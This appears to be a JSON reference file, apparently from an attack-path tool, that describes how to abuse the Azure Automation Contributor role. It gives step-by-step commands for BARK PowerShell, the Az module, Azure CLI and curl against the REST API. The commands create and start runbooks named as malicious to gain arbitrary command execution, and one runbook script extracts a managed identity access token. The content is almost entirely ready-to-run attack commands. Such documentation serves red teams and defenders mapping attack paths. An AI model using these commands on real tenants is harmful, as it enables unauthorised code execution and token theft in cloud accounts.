{
    "AZAutomationContributor": {
        "meaning": "The Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account by creating and executing runbooks.",
        "common": "",
        "windows": {
            "BARK_PowerShell": [
                {
                    "order": 1,
                    "command": "$ARMToken = Get-ARMTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
                    "description": "Acquire Azure Resource Manager scoped JWT using refresh token via BARK"
                },
                {
                    "order": 2,
                    "command": "New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" -Script \"whoami\"",
                    "description": "Create new runbook with arbitrary command using BARK"
                },
                {
                    "order": 3,
                    "command": "Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"",
                    "description": "Execute runbook and retrieve output using BARK"
                }
            ],
            "BARK_Managed_Identity": [
                {
                    "order": 1,
                    "command": "$Script = '$tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI; $tokenResponse.access_token'",
                    "description": "Prepare script to extract managed identity JWT token"
                },
                {
                    "order": 2,
                    "command": "New-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName \"TokenExtractor\" -AutomationAccountPath \"https://management.azure.com/subscriptions/subscription-id/resourceGroups/rg/providers/Microsoft.Automation/automationAccounts/account\" -Script $Script",
                    "description": "Create runbook to extract managed identity token using BARK"
                },
                {
                    "order": 3,
                    "command": "Get-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName \"TokenExtractor\" -AutomationAccountPath \"https://management.azure.com/subscriptions/subscription-id/resourceGroups/rg/providers/Microsoft.Automation/automationAccounts/account\"",
                    "description": "Execute token extraction runbook and retrieve JWT"
                }
            ],
            "PowerShell_Az_Module": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure using Az PowerShell module"
                },
                {
                    "order": 2,
                    "command": "Import-AzAutomationRunbook -ResourceGroupName \"AutomationRG\" -AutomationAccountName \"AutomationAccount\" -Name \"MaliciousRunbook\" -Type PowerShell -Path \"C:\\malicious.ps1\"",
                    "description": "Import malicious runbook into Automation Account"
                },
                {
                    "order": 3,
                    "command": "Start-AzAutomationRunbook -ResourceGroupName \"AutomationRG\" -AutomationAccountName \"AutomationAccount\" -Name \"MaliciousRunbook\"",
                    "description": "Execute the malicious runbook for command execution"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Authenticate to Azure using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az automation runbook create --resource-group AutomationRG --automation-account-name AutomationAccount --name MaliciousRunbook --type PowerShell",
                    "description": "Create new runbook in Automation Account"
                },
                {
                    "order": 3,
                    "command": "az automation runbook replace-content --resource-group AutomationRG --automation-account-name AutomationAccount --name MaliciousRunbook --content-path malicious_script.ps1",
                    "description": "Upload malicious PowerShell script to runbook"
                },
                {
                    "order": 4,
                    "command": "az automation runbook start --resource-group AutomationRG --automation-account-name AutomationAccount --name MaliciousRunbook",
                    "description": "Execute the malicious runbook for command execution"
                }
            ],
            "REST_API_Direct": [
                {
                    "order": 1,
                    "command": "curl -X PUT -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{account}/runbooks/MaliciousRunbook?api-version=2020-01-13-preview\" -d '{\"properties\":{\"runbookType\":\"PowerShell\",\"description\":\"Malicious runbook\"}}'",
                    "description": "Create runbook via REST API"
                },
                {
                    "order": 2,
                    "command": "curl -X PUT -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: text/powershell\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{account}/runbooks/MaliciousRunbook/draft/content?api-version=2020-01-13-preview\" --data-binary @malicious.ps1",
                    "description": "Upload script content to runbook via REST API"
                },
                {
                    "order": 3,
                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Automation/automationAccounts/{account}/runbooks/MaliciousRunbook/start?api-version=2020-01-13-preview\"",
                    "description": "Execute runbook via REST API for command execution"
                }
            ]
        }
    }
}
